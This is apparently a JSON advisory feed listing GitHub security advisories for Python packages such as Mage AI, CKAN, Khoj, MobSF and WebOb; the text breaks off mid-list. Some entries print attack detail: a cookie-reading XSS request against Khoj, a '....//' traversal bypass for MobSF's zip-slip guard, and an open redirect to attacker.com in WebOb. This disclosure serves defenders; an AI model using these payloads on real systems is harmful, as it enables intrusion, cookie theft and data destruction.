{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>Mage AI allows remote users with the \"Viewer\" role to leak arbitrary files from the Mage server due to a path traversal in the \"Pipeline Interaction\" request</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45190\">https://nvd.nist.gov/vuln/detail/CVE-2024-45190</a></li>\n<li><a href=\"https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605\">https://research.jfrog.com/vulnerabilities/mage-ai-pipeline-interaction-request-remote-arbitrary-file-leak-jfsa-2024-001039605</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mrc-w7jh-hx4j\">https://github.com/advisories/GHSA-4mrc-w7jh-hx4j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mrc-w7jh-hx4j",
            "title": "[mage-ai] Mage AI Path Traversal vulnerability",
            "date_modified": "2024-08-23T22:51:36.000Z",
            "date_published": "2024-08-23T21:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mrc-w7jh-hx4j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mage AI allows remote users with the \"Viewer\" role to leak arbitrary files from the Mage server due to a path traversal in the \"Git Content\" request</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45189\">https://nvd.nist.gov/vuln/detail/CVE-2024-45189</a></li>\n<li><a href=\"https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604\">https://research.jfrog.com/vulnerabilities/mage-ai-git-content-request-remote-arbitrary-file-leak-jfsa-2024-001039604</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgxv-795x-3vqr\">https://github.com/advisories/GHSA-cgxv-795x-3vqr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgxv-795x-3vqr",
            "title": "[mage-ai] Mage AI Path Traversal vulnerability",
            "date_modified": "2024-08-23T22:51:34.000Z",
            "date_published": "2024-08-23T21:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgxv-795x-3vqr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mage AI allows remote users with the \"Viewer\" role to leak arbitrary files from the Mage server due to a path traversal in the \"File Content\" request</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45188\">https://nvd.nist.gov/vuln/detail/CVE-2024-45188</a></li>\n<li><a href=\"https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603\">https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v9wr-8wrm-h6p7\">https://github.com/advisories/GHSA-v9wr-8wrm-h6p7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v9wr-8wrm-h6p7",
            "title": "[mage-ai] Mage AI Path Traversal vulnerability",
            "date_modified": "2024-08-23T22:51:31.000Z",
            "date_published": "2024-08-23T21:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v9wr-8wrm-h6p7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Guest users in the Mage AI framework that remain logged in after their accounts are deleted, are mistakenly given high privileges and specifically given access to remotely execute arbitrary code through the Mage AI terminal server.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45187\">https://nvd.nist.gov/vuln/detail/CVE-2024-45187</a></li>\n<li><a href=\"https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602\">https://research.jfrog.com/vulnerabilities/mage-ai-deleted-users-rce-jfsa-2024-001039602</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jg95-r9xh-xw9c\">https://github.com/advisories/GHSA-jg95-r9xh-xw9c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jg95-r9xh-xw9c",
            "title": "[mage-ai] Mage AI incorrectly gives privileges to users with deleted accounts",
            "date_modified": "2024-08-23T22:51:29.000Z",
            "date_published": "2024-08-23T21:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jg95-r9xh-xw9c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Invalid memory access and/or a heap buffer overflow in the TensorFlow XLA compiler in Google TensorFlow before 1.7.1 could cause a crash or read from other parts of process memory via a crafted configuration file.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-10055\">https://nvd.nist.gov/vuln/detail/CVE-2018-10055</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2018-006.md\">https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2018-006.md</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/c89ab82a82585cdaa90bf4911980e9e845909e78\">https://github.com/tensorflow/tensorflow/commit/c89ab82a82585cdaa90bf4911980e9e845909e78</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q492-f7gr-27rp\">https://github.com/advisories/GHSA-q492-f7gr-27rp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q492-f7gr-27rp",
            "title": "[tensorflow-gpu] Improper Restriction of Operations within the Bounds of a Memory Buffer in Google TensorFlow",
            "date_modified": "2024-08-23T22:28:20.000Z",
            "date_published": "2019-04-30T15:37:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q492-f7gr-27rp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in llama_index before 0.10.38. <code>download/integration.py</code> includes an exec call for <code>import {cls_name}</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45201\">https://nvd.nist.gov/vuln/detail/CVE-2024-45201</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/pull/13523\">https://github.com/run-llama/llama_index/pull/13523</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/compare/v0.10.37...v0.10.38\">https://github.com/run-llama/llama_index/compare/v0.10.37...v0.10.38</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/commit/bd827c30484fa085ec769fa55dc7f2add8006ac8\">https://github.com/run-llama/llama_index/commit/bd827c30484fa085ec769fa55dc7f2add8006ac8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fxc2-8m62-m85x\">https://github.com/advisories/GHSA-fxc2-8m62-m85x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fxc2-8m62-m85x",
            "title": "[llama-index-core] LlamaIndex includes an exec call for `import {cls_name}`",
            "date_modified": "2024-08-23T18:54:23.000Z",
            "date_published": "2024-08-22T21:31:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fxc2-8m62-m85x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Stored XSS in organizer and event settings of pretix up to 2024.7.0 allows malicious event organizers to inject HTML tags into e-mail previews on settings page. The default Content Security Policy of pretix prevents execution of attacker-provided scripts, making exploitation unlikely. However, combined with a CSP bypass (which is not currently known) the vulnerability could be used to impersonate other organizers or staff users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8113\">https://nvd.nist.gov/vuln/detail/CVE-2024-8113</a></li>\n<li><a href=\"https://pretix.eu/about/en/blog/20240823-release-2024-7-1\">https://pretix.eu/about/en/blog/20240823-release-2024-7-1</a></li>\n<li><a href=\"https://github.com/pretix/pretix/commit/0f44a2ad4e170882dbe6b9d95dba6c36e4e181cf\">https://github.com/pretix/pretix/commit/0f44a2ad4e170882dbe6b9d95dba6c36e4e181cf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-45rp-q25w-4426\">https://github.com/advisories/GHSA-45rp-q25w-4426</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-45rp-q25w-4426",
            "title": "[pretix] pretix Stored Cross-site Scripting vulnerability",
            "date_modified": "2024-08-23T18:51:03.000Z",
            "date_published": "2024-08-23T15:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-45rp-q25w-4426"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mage AI allows remote unauthenticated attackers to leak the terminal server command history of arbitrary users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8072\">https://nvd.nist.gov/vuln/detail/CVE-2024-8072</a></li>\n<li><a href=\"https://research.jfrog.com/vulnerabilities/mage-ai-terminal-server-infoleak-jfsa-2024-001039574\">https://research.jfrog.com/vulnerabilities/mage-ai-terminal-server-infoleak-jfsa-2024-001039574</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgrq-wvfj-v28j\">https://github.com/advisories/GHSA-cgrq-wvfj-v28j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgrq-wvfj-v28j",
            "title": "[mage-ai] Mage AI allows remote unauthenticated attackers to leak the terminal server command history of arbitrary users",
            "date_modified": "2024-08-22T16:41:47.000Z",
            "date_published": "2024-08-22T09:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgrq-wvfj-v28j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Airflow, versions before 2.10.0, have a vulnerability that allows the developer of a malicious provider to execute a cross-site scripting attack when clicking on a provider documentation link. This would require the provider to be installed on the web server and the&nbsp;user to click the provider link.\nUsers should upgrade to 2.10.0 or later, which fixes this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41937\">https://nvd.nist.gov/vuln/detail/CVE-2024-41937</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/40933\">https://github.com/apache/airflow/pull/40933</a></li>\n<li><a href=\"https://lists.apache.org/thread/lwlmgg6hqfmkpvw5py4w53hxyl37jl6d\">https://lists.apache.org/thread/lwlmgg6hqfmkpvw5py4w53hxyl37jl6d</a></li>\n<li><a href=\"https://github.com/apache/airflow/commit/f1852c2ab28b155e196569780013fbb61a4a1f98\">https://github.com/apache/airflow/commit/f1852c2ab28b155e196569780013fbb61a4a1f98</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w7cp-g8v7-r54m\">https://github.com/advisories/GHSA-w7cp-g8v7-r54m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w7cp-g8v7-r54m",
            "title": "[apache-airflow] Apache Airflow Cross-site Scripting Vulnerability",
            "date_modified": "2024-08-21T20:10:05.000Z",
            "date_published": "2024-08-21T18:31:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w7cp-g8v7-r54m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>There are a number of CKAN plugins, including <a href=\"https://github.com/ckan/ckanext-xloader\">XLoader</a>, <a href=\"https://github.com/ckan/datapusher\">DataPusher</a>, <a href=\"https://docs.ckan.org/en/latest/maintaining/data-viewer.html#resource-proxy\">Resource proxy</a> and <a href=\"https://github.com/ckan/ckanext-archiver/\">ckanext-archiver</a>, that work by downloading the contents of local or remote files in order to perform some actions with their contents (e.g. pushing to the DataStore, streaming contents or saving a local copy). All of them use the resource URL, and there are currently no checks to limit what URLs can be requested. This means that a malicious (or unaware) user can create a resource with a URL pointing to a place where they should not have access in order for one of the previous tools to retrieve it (known as a <a href=\"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\">Server Side Request Forgery</a>).</p>\n<h3 id=\"patches-and-workarounds\">Patches and Workarounds</h3>\n<p>Users wanting to protect against these kinds of attacks can use one or a combination of the following approaches:</p>\n<ul>\n<li>Use a separate HTTP proxy like <a href=\"https://www.squid-cache.org/\">Squid</a> that can be used to allow / disallow IPs, domains etc as needed, and make CKAN extensions aware of this setting via the <a href=\"https://docs.ckan.org/en/latest/maintaining/configuration.html#ckan-download-proxy\"><code>ckan.download_proxy</code></a> config option. </li>\n<li>Implement custom firewall rules to prevent access to restricted resources.</li>\n<li>Use custom validators on the resource <code>url</code> field to block/allow certain domains or IPs.</li>\n</ul>\n<p>All latest versions of the plugins linked above support the <code>ckan.download_proxy</code> settings. Support for this setting in the Resource Proxy plugin was included in CKAN 2.10.5 and 2.11.0</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://feeding.cloud.geek.nz/posts/restricting-outgoing-webapp-requests-using-squid-proxy/\">Blog post</a> provides more details on how to configure a Squid proxy to prevent these issues</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ckan/ckan/security/advisories/GHSA-g9ph-j5vj-f8wm\">https://github.com/ckan/ckan/security/advisories/GHSA-g9ph-j5vj-f8wm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43371\">https://nvd.nist.gov/vuln/detail/CVE-2024-43371</a></li>\n<li><a href=\"https://github.com/ckan/ckan/commit/382beaec98cb331f2a030459ef043c50eaf5ad53\">https://github.com/ckan/ckan/commit/382beaec98cb331f2a030459ef043c50eaf5ad53</a></li>\n<li><a href=\"https://github.com/ckan/ckan/commit/8601183cc2fc87277ea5b33ff75c3a5610812ab5\">https://github.com/ckan/ckan/commit/8601183cc2fc87277ea5b33ff75c3a5610812ab5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g9ph-j5vj-f8wm\">https://github.com/advisories/GHSA-g9ph-j5vj-f8wm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g9ph-j5vj-f8wm",
            "title": "[ckan] Potential access to sensitive URLs via CKAN extensions (SSRF)",
            "date_modified": "2024-08-21T22:17:11.000Z",
            "date_published": "2024-08-21T18:27:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g9ph-j5vj-f8wm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <a href=\"https://docs.ckan.org/en/2.10/maintaining/data-viewer.html#datatables-view\">Datatables view plugin</a> did not properly escape record data coming from the DataStore, leading to a potential XSS vector.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Sites running CKAN &gt;= 2.7.0 with the <code>datatables_view</code> plugin activated. This is a plugin included in CKAN core, that not activated by default but it is widely used to preview tabular data.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been fixed in CKAN 2.10.5 and 2.11.0</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Prevent importing of tabular files to the DataStore via DataPusher, XLoader,etc, at least those published from untrusted sources.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ckan/ckan/security/advisories/GHSA-r3jc-vhf4-6v32\">https://github.com/ckan/ckan/security/advisories/GHSA-r3jc-vhf4-6v32</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41675\">https://nvd.nist.gov/vuln/detail/CVE-2024-41675</a></li>\n<li><a href=\"https://github.com/ckan/ckan/commit/9e89ce8220ab1445e0bd85a67994a51d9d3d2688\">https://github.com/ckan/ckan/commit/9e89ce8220ab1445e0bd85a67994a51d9d3d2688</a></li>\n<li><a href=\"https://github.com/ckan/ckan/commit/d7dfe8c427b1c63c75d788a609f3b7d7620a25a1\">https://github.com/ckan/ckan/commit/d7dfe8c427b1c63c75d788a609f3b7d7620a25a1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r3jc-vhf4-6v32\">https://github.com/advisories/GHSA-r3jc-vhf4-6v32</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r3jc-vhf4-6v32",
            "title": "[ckan] CKAN has Cross-site Scripting vector in the Datatables view plugin",
            "date_modified": "2024-08-21T18:26:30.000Z",
            "date_published": "2024-08-21T18:26:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r3jc-vhf4-6v32"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>If there were connection issues with the Solr server, the internal Solr URL (potentially including credentials) could be leaked to <code>package_search</code> calls as part of the returned error message</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been patched in CKAN 2.10.5 and 2.11.0</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ckan/ckan/security/advisories/GHSA-2rqw-cfhc-35fh\">https://github.com/ckan/ckan/security/advisories/GHSA-2rqw-cfhc-35fh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41674\">https://nvd.nist.gov/vuln/detail/CVE-2024-41674</a></li>\n<li><a href=\"https://github.com/ckan/ckan/commit/f6b032cd7082d784938165bbd113557639002ca7\">https://github.com/ckan/ckan/commit/f6b032cd7082d784938165bbd113557639002ca7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2rqw-cfhc-35fh\">https://github.com/advisories/GHSA-2rqw-cfhc-35fh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2rqw-cfhc-35fh",
            "title": "[ckan] CKAN may leak Solr credentials via error message in package_search action",
            "date_modified": "2024-08-21T18:26:28.000Z",
            "date_published": "2024-08-21T18:26:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2rqw-cfhc-35fh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The Automation feature allows a user to insert arbitrary HTML inside the task instructions, resulting in a Stored XSS. </p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>q</code> parameter for the <code>/api/automation</code> endpoint does not get correctly sanitized when rendered on the page, resulting in the ability of users to inject arbitrary HTML/JS.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>POST /api/automation?q=%22%3E%3C%2Ftextarea%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E%3Cscript%3Ealert(2)%3C%2Fscript%3E\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Stored XSS:\n<img alt=\"image\" src=\"https://github.com/khoj-ai/khoj/assets/115566010/6b5b9f60-e05c-448b-82b4-bf010ad8a4f0\"></p>\n<h3 id=\"fix\">Fix</h3>\n<ul>\n<li>Added a Content Security Policy to all config pages on the web client, including the automation page</li>\n<li>Used DOM scripting to construct all components on the config pages, including the automation page</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/khoj-ai/khoj/security/advisories/GHSA-cf72-vg59-4j4h\">https://github.com/khoj-ai/khoj/security/advisories/GHSA-cf72-vg59-4j4h</a></li>\n<li><a href=\"https://github.com/khoj-ai/khoj/commit/1c7a562880eeb7354325545d2cf6c5d1d1134812\">https://github.com/khoj-ai/khoj/commit/1c7a562880eeb7354325545d2cf6c5d1d1134812</a></li>\n<li><a href=\"https://github.com/khoj-ai/khoj/commit/55be90cdd2f9d6a09c8bf9ceea52fc36b9201626\">https://github.com/khoj-ai/khoj/commit/55be90cdd2f9d6a09c8bf9ceea52fc36b9201626</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43396\">https://nvd.nist.gov/vuln/detail/CVE-2024-43396</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cf72-vg59-4j4h\">https://github.com/advisories/GHSA-cf72-vg59-4j4h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cf72-vg59-4j4h",
            "title": "[khoj] Khoj Vulnerable to Stored Cross-site Scripting In Automate (Preview feature)",
            "date_modified": "2024-08-21T14:53:27.000Z",
            "date_published": "2024-08-20T19:59:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cf72-vg59-4j4h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>NLTK through 3.8.1 allows remote code execution if untrusted packages have pickled Python code, and the integrated data package download functionality is used. This affects, for example, averaged_perceptron_tagger and punkt.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39705\">https://nvd.nist.gov/vuln/detail/CVE-2024-39705</a></li>\n<li><a href=\"https://github.com/nltk/nltk/issues/2522\">https://github.com/nltk/nltk/issues/2522</a></li>\n<li><a href=\"https://github.com/nltk/nltk/issues/3266\">https://github.com/nltk/nltk/issues/3266</a></li>\n<li><a href=\"https://github.com/nltk/nltk/commit/441aecb7d33014bd08672232c6c8bb69c2ceaba2\">https://github.com/nltk/nltk/commit/441aecb7d33014bd08672232c6c8bb69c2ceaba2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgvx-9447-vcch\">https://github.com/advisories/GHSA-cgvx-9447-vcch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgvx-9447-vcch",
            "title": "[nltk] ntlk unsafe deserialization vulnerability",
            "date_modified": "2024-08-20T16:05:48.000Z",
            "date_published": "2024-06-28T00:33:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgvx-9447-vcch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in corydolphin/flask-cors version 4.0.1 allows the <code>Access-Control-Allow-Private-Network</code> CORS header to be set to true by default, without any configuration option. This behavior can expose private network resources to unauthorized external access, leading to significant security risks such as data breaches, unauthorized access to sensitive information, and potential network intrusions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6221\">https://nvd.nist.gov/vuln/detail/CVE-2024-6221</a></li>\n<li><a href=\"https://huntr.com/bounties/a42935fc-6f57-4818-bca4-3d528235df4d\">https://huntr.com/bounties/a42935fc-6f57-4818-bca4-3d528235df4d</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/flask-cors/PYSEC-2024-71.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/flask-cors/PYSEC-2024-71.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hxwh-jpp2-84pm\">https://github.com/advisories/GHSA-hxwh-jpp2-84pm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hxwh-jpp2-84pm",
            "title": "[flask-cors] Flask-CORS allows the `Access-Control-Allow-Private-Network` CORS header to be set to true by default",
            "date_modified": "2024-08-21T14:45:04.000Z",
            "date_published": "2024-08-18T21:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hxwh-jpp2-84pm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Upon reviewing the MobSF source code, I identified a flaw in the Static Libraries analysis section. Specifically, during the extraction of .a extension files, the measure intended to prevent Zip Slip attacks is improperly implemented.</p>\n<p>Since the implemented measure can be bypassed, the vulnerability allows an attacker to extract files to any desired location within the server running MobSF.</p>\n<h3 id=\"details\">Details</h3>\n<p>Upon examining lines 183-192 of the <code>mobsf/StaticAnalyzer/views/common/shared_func.py</code> file, it is observed that there is a mitigation against Zip Slip attacks implemented as <code>a.decode('utf-8', 'ignore').replace('../', '').replace('..\\\\', '')</code>. However, this measure can be bypassed using sequences like <code>....//....//....//</code>. Since the replace operation is not recursive, this sequence is transformed into <code>../../../</code> after the replace operation, allowing files to be written to upper directories.</p>\n<img src=\"https://github.com/user-attachments/assets/fadf4bcc-1a92-4655-b66a-5349278ad9c5\" alt=\"image\" width=\"448\">\n\n\n<p>For the proof of concept, I created an .a archive file that renders MobSF unusable by writing an empty file with the same name over the database located at <code>/home/mobsf/.MobSF/db.sqlite3</code>.</p>\n<img src=\"https://github.com/user-attachments/assets/54acf101-3931-401f-9970-a0934265eecb\" alt=\"poc a_1\" width=\"300\">\n\n\n<p>I am including the binary used for the POC named <code>poc.VULN</code>. To test it, you need to rename this binary to <code>poc.a</code>.</p>\n<p> <strong>Warning:</strong> As soon as you scan this file with MobSF, the database will be deleted, rendering MobSF unusable.</p>\n<p>PoC Binary File (<a href=\"https://drive.google.com/file/d/1K2eHYIZ1hUbs-Vi5zhKAKecnd0nDB8lO/view?usp=share_link\">poc.VULN</a>)</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://github.com/user-attachments/assets/3225ccb0-cb00-47a5-8305-37a40ca1ae7f\">https://github.com/user-attachments/assets/3225ccb0-cb00-47a5-8305-37a40ca1ae7f</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>When a malicious .a file is scanned with MobSF, a critical vulnerability is present as it allows files to be extracted to any location on the server where MobSF is running. In this POC, I deleted the database, but it is also possible to achieve RCE by overwriting binaries of certain tools or by overwriting the /etc/passwd file.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-4hh3-vj32-gr6j\">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-4hh3-vj32-gr6j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43399\">https://nvd.nist.gov/vuln/detail/CVE-2024-43399</a></li>\n<li><a href=\"https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/cc625fe8430f3437a473e82aa2966d100a4dc883\">https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/cc625fe8430f3437a473e82aa2966d100a4dc883</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4hh3-vj32-gr6j\">https://github.com/advisories/GHSA-4hh3-vj32-gr6j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4hh3-vj32-gr6j",
            "title": "[mobsf] Mobile Security Framework (MobSF) has a Zip Slip Vulnerability in .a Static Library Files",
            "date_modified": "2024-08-20T18:44:48.000Z",
            "date_published": "2024-08-19T17:29:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4hh3-vj32-gr6j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When WebOb normalizes the HTTP Location header to include the request hostname, it does so by parsing the URL that the user is to be redirected to with Python's urlparse, and joining it to the base URL. <code>urlparse</code> however treats a <code>//</code> at the start of a string as a URI without a scheme, and then treats the next part as the hostname. <code>urljoin</code> will then use that hostname from the second part as the hostname replacing the original one from the request.</p>\n<pre><code>&gt;&gt;&gt; parse.urlparse(\"//example.com/test/path\")\nParseResult(scheme='', netloc='example.com', path='/test/path', params='', query='', fragment='')\n</code></pre>\n<p>WebOb uses <code>urljoin</code> to take the request URI and joining the redirect location, so assuming the request URI is: <code>https://example.org//example.com/some/path</code>, and the URL to redirect to (for example by adding a slash automatically) is <code>//example.com/some/path/</code> that gets turned by <code>urljoin</code> into:</p>\n<pre><code>&gt;&gt;&gt; parse.urljoin(\"https://example.org//attacker.com/some/path\", \"//attacker.com/some/path/\")\n'https://attacker.com/some/path/'\n</code></pre>\n<p>Which redirects from <code>example.org</code> where we want the user to stay to <code>attacker.com</code></p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue is patched in WebOb 1.8.8</p>\n<p>Older versions of WebOb continue to be vulnerable to this issue, and should be avoided.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Any use of the <code>Response</code> class that includes a <code>location</code> can be rewritten to make sure to always pass a full URI that includes the hostname to redirect the user to.</p>\n<h3 id=\"thanks\">Thanks</h3>\n<ul>\n<li>Sara Gao</li>\n</ul>\n<p>This issue was reported via the <a href=\"mailto:pylons-project-security@googlegroups.com\">Pylons Project Security List</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Pylons/webob/security/advisories/GHSA-mg3v-6m49-jhp3\">https://github.com/Pylons/webob/security/advisories/GHSA-mg3v-6m49-jhp3</a></li>\n<li><a href=\"https://github.com/Pylons/webob/commit/f689bcf4f0a1f64f1735b1d5069aef5be6974b5b\">https://github.com/Pylons/webob/commit/f689bcf4f0a1f64f1735b1d5069aef5be6974b5b</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42353\">https://nvd.nist.gov/vuln/detail/CVE-2024-42353</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mg3v-6m49-jhp3\">https://github.com/advisories/GHSA-mg3v-6m49-jhp3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mg3v-6m49-jhp3",
            "title": "[webob] WebOb's location header normalization during redirect leads to open redirect",
            "date_modified": "2024-08-14T22:17:05.000Z",
            "date_published": "2024-08-14T17:48:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mg3v-6m49-jhp3"
            },
            "tags": [
                "severity"
            ]
        },
        {
